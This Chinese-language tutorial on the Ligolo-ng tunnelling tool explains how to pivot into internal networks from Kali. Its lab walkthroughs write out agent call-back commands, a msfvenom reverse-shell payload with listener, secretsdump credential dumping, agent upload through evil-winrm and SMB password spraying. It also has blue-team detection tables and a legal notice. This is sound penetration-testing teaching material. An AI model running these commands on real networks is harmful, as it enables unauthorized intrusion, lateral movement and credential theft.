# Ligolo-ng（TUN 隧道 / 内网路由穿透）

> **一句话**：在被控主机上跑一个 agent，在 Kali 上起一个 TUN 网卡——内网网段就像「直连」一样出现在你的路由表里，不需要 SOCKS，不需要为每个工具配代理。
> **分类**：后渗透 / 协议隧道（Command & Control）｜ **Kali 包**：`ligolo-ng`（命令 `ligolo-proxy`、`ligolo-agent`）｜ **官方文档**：<https://github.com/nicocha30/ligolo-ng>

---

## 1. 它解决什么问题

Chisel/proxychains 方案有个根本痛点：**只有支持 SOCKS 的工具能用**，而且每加一层就多一层 SOCKS 开销，UDP/ICMP 完全不通，`nmap` 只能退化成 `-sT`。

Ligolo-ng 换了个思路：**在 Kali 上创建一块虚拟网卡（TUN），把内网网段的路由指过去**。于是：

| 维度 | Chisel + proxychains | **Ligolo-ng** |
|------|----------------------|---------------|
| 访问方式 | 必须 `proxychains4 <工具>` | **直接用原生命令**，无需代理包装 |
| 协议支持 | 仅 TCP | **TCP + UDP + ICMP**（能 ping、能跑 DNS） |
| 扫描 | `nmap -sT`（慢，无 SYN 特征） | **nmap 原生命令**（可 `-sS`） |
| UDP 应用 | 不支持 | 支持（SNMP、DHCP、Kerberos 的 UDP 部分等） |
| 多层网段 | 每层一次 SOCKS | 加一条路由即可 |
| 性能 | 单 WebSocket 串行 | 更快（多路复用 + TUN） |
| 权限要求 | 无 | Kali 侧需要创建 TUN（通常 root） |

适用场景：**内网横向里需要跑「不支持代理」的工具**（如 `gotools`、`nuclei`、`impacket` 的某些 UDP 交互、原生 `nmap` 综合扫描），或者需要**多层网段**。

对比同类：

- **vs `chisel`**：Chisel 更像「端口搬运工」，Ligolo-ng 更像「虚拟网线」。简单单层转发 Chisel 够用；复杂内网 Ligolo-ng 明显更舒服。
- **vs `ssh -w`（TUN over SSH）**：思路相同，但 Ligolo-ng 无需目标有 SSH，且兼容 Windows agent。
- **vs Metasploit `autoroute`**：`autoroute` 只对 msf 自身流量生效；Ligolo-ng 对**系统级所有进程**生效。

---

## 2. 工作原理

```
┌─────────────── Kali（攻击机） ───────────────┐
│ ligolo-proxy -selfcert                      │
│   ├─ 监听 11601（agent 回连）                 │
│   └─ 创建 TUN 网卡（如 ligolo）               │
│        └─ 配置路由：10.10.20.0/24 → ligolo     │
└───────────────▲──────────────────────────────┘
                │  TLS（默认自签）+ 多路复用
┌───────────────┴──────────────┐
│ 被控主机（内网侧，双网卡）      │
│ ligolo-agent -connect <kali>:11601 -ignore-cert
│   └─ 在内网侧发包（相当于「网线插在这台机器上」）
└──────────────────────────────┘
```

关键概念：

- **Proxy（Kali 侧）**：管理界面 + 隧道端点。它给每个会话分配一个 TUN 接口/别名，由你把路由指向它。
- **Agent（内网侧）**：只做「转发」。它不需要管理员权限（普通用户即可运行，因为它只是发起连接并转发字节流）。
- **TUN 接口**：Linux 的三层虚拟网卡。Ligolo-ng 借它在用户态把 IP 包「灌」进隧道，所以**协议无关**（TCP/UDP/ICMP 都能过）。
- **TLS**：默认用自签证书（`-selfcert`），agent 用 `-ignore-cert` 跳过校验，或用 `-fingerprint` 校验。
- **多会话**：可以同时有多个 agent，每个映射到不同接口（`interface_create` 指定别名）。

---

## 3. 安装与快速上手

```bash
sudo apt update
sudo apt install ligolo-ng
command -v ligolo-proxy ligolo-agent
```

```bash
# ① Kali：起 proxy（自签证书）
sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601
```

```console
ligolo-ng » INFO[0000] Starting ligolo-proxy
ligolo-ng » INFO[0000] Certificate chain does not exist, creating it
ligolo-ng » INFO[0000] Listening on 0.0.0.0:11601
```

```bash
# ② 被控主机：上传 agent 后回连（Windows 用 agent.exe）
./agent -connect 192.168.56.5:11601 -ignore-cert
```

```console
ligolo-ng » agent: Connecting to 192.168.56.5:11601
ligolo-ng » agent: Connection established
ligolo-ng » agent: TLS handshake completed
```

```bash
# ③ Kali 的 proxy 控制台里操作
ligolo-ng » session            # 选择会话
[Agent : www-data@jump01] » ifconfig          # 看 agent 能看到哪些网段
[Agent : www-data@jump01] » interface_create --name ligolo
[Agent : www-data@jump01] » interface_add_route --name ligolo --route 10.10.20.0/24
[Agent : www-data@jump01] » start --tun ligolo
```

然后**不需要任何代理**，直接：

```bash
nmap -sS -Pn -p 445,3389,5985 10.10.20.5
nxc smb 10.10.20.5 -u jdoe -p 'Summer2024!' --shares
```

> 不同版本子命令略有差异（`interface_create` / `interface_add_route` / `start --tun`）。**以 `ligolo-proxy` 控制台内的 `help` 与 Tab 补全为准**。
> Kali 上 `ligolo-proxy` 需要创建 TUN 网卡，**需要 root**（或 CAP_NET_ADMIN）：`sudo ligolo-proxy ...`。

---

## 4. 核心参数详解

### 4.1 `ligolo-proxy`（Kali 侧）

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `-selfcert` | 自动生成自签证书 | **入门必用**；生产化场景用真实证书 |
| `-laddr <ip:port>` | 监听地址 | 默认 `0.0.0.0:11601`；只对特定网卡开放 |
| `-certfile` / `-keyfile` | 指定证书 | 用受信证书可降低流量可疑度 |
| `-autocert` | 用 Let's Encrypt 自动签发 | 有公网域名时 |
| `-daemon` | 后台守护 | 配合 `-daemon-laddr`（本地管理模式） |
| `-daemon-laddr` | 守护模式的管理端口 | 让操作台与数据面分离 |
| `-selfcert-domain` | 自签证书的域名 | 填一个看起来正常的域名 |
| `-ignore-cert` | 忽略 agent 证书（反向信任） | 少见 |
| `-v` | 详细日志 | 排错 |

**proxy 控制台命令（这才是真正的「参数」）**：

| 命令 | 作用 | 使用建议 |
|------|------|----------|
| `session` | 列出/选择 agent 会话 | 多 agent 时按编号选择 |
| `ifconfig` | 查看 agent 上的网卡与网段 | **先看这个再决定路由** |
| `interface_create --name <别名>` | 创建 TUN 接口（别名） | 每个会话一个别名，便于区分 |
| `interface_add_route --name <别名> --route <CIDR>` | 添加路由到该接口 | 多个网段就加多条 |
| `interface_list` | 列出接口 | 确认已创建 |
| `start --tun <别名>` | **启动隧道** | 不 start 则路由不生效 |
| `stop` | 停止隧道 | 切换会话/收工前 |
| `listener_list` | 查看 agent 侧的监听/转发 | 用于「反向监听」（把 Kali 的服务暴露给内网） |
| `listener_add --addr 0.0.0.0:PORT --to 127.0.0.1:PORT` | 在 agent 上开监听并转发到 Kali | 需要内网机器主动连你时用（如反弹 shell 到内网） |
| `session` 内的 `!` 命令 | 在 agent 上执行命令 | 部分版本支持 |
| `help` | 全部命令 | **版本差异大，以它为准** |

### 4.2 `ligolo-agent`（被控主机侧）

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `-connect <ip:port>` | 回连 proxy | 必填 |
| `-ignore-cert` | 忽略 TLS 证书校验 | 自签证书场景必加 |
| `-retry` | 断线自动重连 | **强烈建议加** |
| `-bind <addr>` | 指定本地绑定地址 | 多网卡时指定出口 IP |
| `-laddr` | agent 本地监听（接受二次连接） | 少见 |
| `-proxy <url>` | 通过代理回连 | 逐层穿透时用 |
| `-v` | 详细日志 | 排错 |
| `-reconnect` | 重连间隔相关 | 视版本 |

---

## 5. 实战演练

> **环境声明**：全部在**自建靶场**中进行。拓扑：Kali `192.168.56.5` → 双网卡跳板机 `192.168.56.10`（内网侧 `10.10.20.10`）→ 内网 Windows `10.10.20.5`、内网 Web `10.10.20.6`。目标还可加入更深网段 `10.10.30.0/24`（仅 `10.10.20.5` 可达）。全部主机为你自有或已获授权。**禁止对未授权网络建立隧道。**

### 场景 1：单层内网 —— 从「要 proxychains」到「像直连一样」

```bash
# ① Kali：起 proxy
sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601
```

```console
ligolo-ng » INFO[0000] Listening on 0.0.0.0:11601
```

```bash
# ② 跳板机（已拿到 shell）：上传 agent 并回连
./agent -connect 192.168.56.5:11601 -ignore-cert -retry
```

```console
ligolo-ng » agent: Connection established
ligolo-ng » agent: TLS handshake completed
```

```console
# ③ proxy 控制台
ligolo-ng » session
? Select a session: [Use arrows to move]  Agent (www-data@jump01)
[Agent : www-data@jump01] » ifconfig
┌────────────────────────────────────────────────────┐
│ Interface 0                                        │
│ Name: eth0                                         │
│ Hardware MAC: 08:00:27:xx:xx:xx                    │
│ IP Addresses:                                      │
│   192.168.56.10/24                                 │
├────────────────────────────────────────────────────┤
│ Interface 1                                        │
│ Name: eth1                                         │
│ IP Addresses:                                      │
│   10.10.20.10/24                                   │  ← 内网网段！
└────────────────────────────────────────────────────┘
[Agent : www-data@jump01] » interface_create --name ligolo
[Agent : www-data@jump01] » interface_add_route --name ligolo --route 10.10.20.0/24
[Agent : www-data@jump01] » start --tun ligolo
```

```console
[Agent : www-data@jump01] » INFO[0123] Starting tunnel to www-data@jump01 (uuid)
```

```bash
# ④ 现在**直接**用工具（不需要 proxychains）
ip route | grep ligolo
```

```console
10.10.20.0/24 dev ligolo scope link
```

```bash
nmap -sS -Pn -p 139,445,3389,5985 10.10.20.5
```

```console
Nmap scan report for 10.10.20.5
Host is up (0.0031s latency).
PORT     STATE SERVICE
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```

**解读**：对比 Chisel 方案——这里**直接用了 `-sS`（SYN 半开扫描）**，走原生 socket，速度与准确度都更好；而且 `nxc`、`impacket`、`evil-winrm`、`curl` 全部无需任何包装。这是 Ligolo-ng 的核心体验差异。

```bash
# ⑤ 直接横向
nxc smb 10.10.20.0/24 -u jdoe -p 'Summer2024!' --continue-on-success
evil-winrm -i 10.10.20.5 -u Administrator -p 'Passw0rd!'
impacket-secretsdump 'CONTOSO/Administrator:Passw0rd!'@10.10.20.5
```

### 场景 2：让内网主机反连到你（`listener_add`）

内网机器往往**不能**主动连到 Kali 的公网 IP，但能连到跳板机。这时让 agent 在内网侧开监听：

```console
[Agent : www-data@jump01] » listener_list
[Agent : www-data@jump01] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
```

```console
INFO[0200] Starting listener on 0.0.0.0:4444 → 127.0.0.1:4444
```

```bash
# Kali 上起监听（等待内网主机把 shell 弹到这里）
nc -lvnp 4444
# 或 msf handler
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload linux/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 127.0.0.1    ← 注意：流量会被 listener 转过来
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run
```

**解读**：`listener_add` 让「内网 → 跳板机:4444」的流量被隧道搬到「Kali:4444」。于是你生成的反弹 payload 里 `LHOST` 填**跳板机的内网地址**（`10.10.20.10`），而不是 Kali。这是 Ligolo-ng 相对 Chisel 的实用增强。

```bash
# 生成 payload 时指向跳板机的内网地址
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.20.10 LPORT=4444 -f elf -o /tmp/rev
```

### 场景 3：多层网段（Ligolo-ng 真正碾压 Chisel 的地方）

内网 `10.10.20.5` 上还有一块 `10.10.30.0/24` 只有它能访问：

```console
# ① 在 10.10.20.5 上再跑一个 agent（从 Kali 通过第一层隧道投递）
#    Kali 已有到 10.10.20.0/24 的路由，所以可以直连它的 445/5985
nxc smb 10.10.20.5 -u Administrator -p 'Passw0rd!' --shares
```

```console
SMB  10.10.20.5  445  APP01  [+] CONTOSO\Administrator:Passw0rd! (Pwn3d!)
SMB  10.10.20.5  445  APP01  [+] CONTOSO\Administrator:Passw0rd!
```

```bash
# 通过 WinRM 在 10.10.20.5 上投放第二个 agent（示例）
evil-winrm -i 10.10.20.5 -u Administrator -p 'Passw0rd!'
*Evil-WinRM* PS C:\> upload /usr/share/ligolo-ng/agent.exe C:\Windows\Temp\a.exe
*Evil-WinRM* PS C:\> C:\Windows\Temp\a.exe -connect 10.10.20.10:11601 -ignore-cert -retry
```

**注意**：第二个 agent 应该连到**它可达**的地址。若它只可达 `10.10.20.10`，就需要在跳板机上再跑一个 proxy 并把端口接进来（或者用 `listener_add` 技巧把 Kali 的 11601 暴露到内网）。

```console
# ② Kali 的 proxy 控制台：选新会话，创建**独立别名**并加路由
ligolo-ng » session
[Agent : Administrator@APP01] » interface_create --name ligolo2
[Agent : Administrator@APP01] » interface_add_route --name ligolo2 --route 10.10.30.0/24
[Agent : Administrator@APP01] » start --tun ligolo2
```

```bash
# ③ 现在两个网段同时可达
ip route | grep ligolo
```

```console
10.10.20.0/24 dev ligolo  scope link
10.10.30.0/24 dev ligolo2 scope link
```

```bash
nmap -sS -Pn -p 445,3389 10.10.30.10 10.10.30.11
nxc smb 10.10.30.0/24 -u svc_backup -p 'Backup2023!' --continue-on-success
```

**解读**：每个 agent 一个独立 TUN 别名 + 各自的路由，**天然支持多层嵌套**，不需要像 Chisel 那样层层套 SOCKS。这是 Ligolo-ng 在复杂内网中的决定性优势。

---

## 6. 输出解读

| 输出 | 含义 | 下一步 |
|------|------|--------|
| `Listening on 0.0.0.0:11601` | proxy 就绪 | 等 agent 回连 |
| `agent: Connection established` | agent 已连上 | 回 proxy 控制台 `session` |
| `ifconfig` 出现新网段 | 该 agent 能到这个网 | 为它 `interface_add_route` |
| `Starting tunnel to <agent>` | 隧道已启动 | 检查 `ip route` |
| `ip route` 出现 `<CIDR> dev ligolo` | **路由生效** | 可直接用原生命令 |
| `interface_create` 报已存在 | 别名重复 | 换名字或用 `interface_list` 查看 |
| `listen tcp ... bind: address already in use` | 11601/端口被占 | 换端口或杀旧进程 |
| `operation not permitted`（Kali 侧） | 无权限创建 TUN | `sudo` 运行 `ligolo-proxy` |
| agent 报 `certificate signed by unknown authority` | 未加 `-ignore-cert` | 加 `-ignore-cert`（或用 `-fingerprint` 校验） |
| 隧道通了但目标不通 | agent 侧到目标其实不可达 | 在 agent 上 `ping`/`nc` 验证 |
| 会话频繁掉线 | 网络抖动 | agent 加 `-retry`；proxy 保持前台 |

---

## 7. 与其他工具配合

```
① 拿到跳板机 shell
        │
② Kali: sudo ligolo-proxy -selfcert        ← TUN 隧道端点
   跳板机: agent -connect <kali>:11601 -ignore-cert -retry
        │
③ proxy 控制台: session → ifconfig → interface_create → interface_add_route → start
        │
④ 此后如同直连：
     nmap（可 -sS） / nxc / impacket / evil-winrm / curl / hydra / nuclei …
     甚至可以直接 xfreerdp、浏览器访问内网 Web
        │
⑤ 多层：在更深网段的主机上再跑一个 agent，建 ligolo2 + 路由
⑥ 需要内网反连：listener_add 把 Kali 的端口暴露给内网
```

- 更轻量的单层方案：[`chisel.md`](chisel.md)
- 代理驱动（Ligolo-ng 场景下通常**不再需要**，但某些工具行为异常时可用）：[`proxychains4.md`](proxychains4.md)
- 隧道后的横向：[`netexec.md`](netexec.md)、[`impacket.md`](impacket.md)、[`evil-winrm.md`](evil-winrm.md)

---

## 8. 常见坑与排错

| 报错/现象 | 原因 | 解决 |
|-----------|------|------|
| `operation not permitted` | 创建 TUN 需要权限 | `sudo ligolo-proxy`；确认 `/dev/net/tun` 存在 |
| 隧道 start 了但 ping 不通 | 没加路由 / 加错接口 | `ip route` 检查；`interface_add_route` 指定**正确的别名** |
| `interface_create` 后路由不生效 | 忘了 `start --tun <别名>` | 必须显式 start |
| agent 连不上 proxy | 出站被拦 / 地址写错 | 先 `nc -vz <kali> 11601` 验证；必要时用 `-proxy` 走上游代理 |
| 证书报错 | 自签证书 | `-ignore-cert`，或用 `-fingerprint` 做校验（更安全） |
| 多 agent 路由串了 | 别名/路由冲突 | 每个 agent 用独立别名 + 只加自己可达的网段 |
| 内网主机反连不到 Kali | 缺 `listener_add` | 在 agent 上加监听转发；payload 的 `LHOST` 填**跳板机内网地址** |
| 某些工具仍连不上内网 | 该工具自己做 DNS/名称解析 | 在 Kali 的 `/etc/hosts` 加内网主机名，或让 DNS 走隧道 |
| Windows agent 被杀软删 | 特征命中 | 授权测试中记录；说明终端防护生效 |
| 隧道吞吐低 | 单连接瓶颈/MTU 问题 | 减少同时在线会话；避免套多层 |
| 会话列表里一堆旧 agent | 僵尸条目 | proxy 控制台里清理；重启 proxy |
| 命令与文档不一致 | **版本差异大** | 一切以控制台内 `help` 为准 |

---

## 9. 防御视角（蓝队）

| 攻击面 | 检测信号 | 缓解措施 |
|--------|----------|----------|
| Agent 回连（长 TLS 连接） | 内网主机**出站**到固定端口（默认 11601）的**长时 TLS 连接**；流量特征不符合该端口常见协议 | 出站白名单 + 强制正向代理；TLS 检查（JA3/JA4 指纹）；长连接基线告警 |
| Agent 二进制落地 | Go 静态编译的单文件可执行（Windows/Linux）、无签名、名称可疑 | 应用白名单（WDAC/AppLocker）、执行日志（4688/Sysmon 1）、文件哈希情报 |
| TUN 接口创建（攻击机侧） | 攻击者本机行为，通常无企业日志 | 靠攻击面收敛（不给对手立足点） |
| 隧道内的横向 | 单主机短时间内连接大量内网 IP/端口；跨网段访问突增 | **网络分段**（VLAN/微隔离）、主机防火墙、东西向流量审计 |
| UDP/DNS 异常 | Ligolo-ng 支持 UDP，隧道内可出现非常规 UDP 会话 | 内网 UDP 出站限制、DNS 只允许企业 DNS |
| 长连接心跳模式 | 固定间隔的小包传输（心跳） | DPI/流量行为分析、NetFlow 异常检测 |
| 内网反连（`listener_add`） | 内网主机监听新端口并被外部连接 | 主机防火墙默认拒绝入站、端口监听基线监控 |

**蓝队要点**：与 Chisel 相同——**出站流量治理是决定性的**。另外，这类工具**不做内存注入、不依赖漏洞**，因此「打补丁」对它们无效；只能靠**网络控制 + 终端白名单 + 行为检测**。

---

## 10. 参考

- Ligolo-ng 官方仓库（含使用方法与版本差异）：<https://github.com/nicocha30/ligolo-ng>
- Kali 工具页：<https://www.kali.org/tools/ligolo-ng/>
- MITRE ATT&CK · 协议隧道（T1572）、代理（T1090）、非应用层协议（T1095）
- 本地命令：`ligolo-proxy -h`、`ligolo-agent -h`，以及 proxy 控制台内的 `help`

## ⚠️ 法律与伦理

建立隧道以绕过网络边界控制、访问未授权主机，可能触犯《刑法》第 285 条（非法侵入计算机信息系统、非法获取计算机信息系统数据、非法控制计算机信息系统）、第 286 条，以及《网络安全法》第 27 条。

本教程仅用于：**书面授权的渗透测试与红队演练、CTF、自建靶场、自有环境的网络实验**。测试结束必须：① 在 proxy 控制台 `stop` 并关闭 `ligolo-proxy`；② 删除目标主机上的 agent 二进制与临时文件；③ 清理 Kali 上创建的 TUN 接口与路由（`sudo ip link delete ligolo` 等）；④ 在报告中如实记录隧道活动时间段与访问范围。
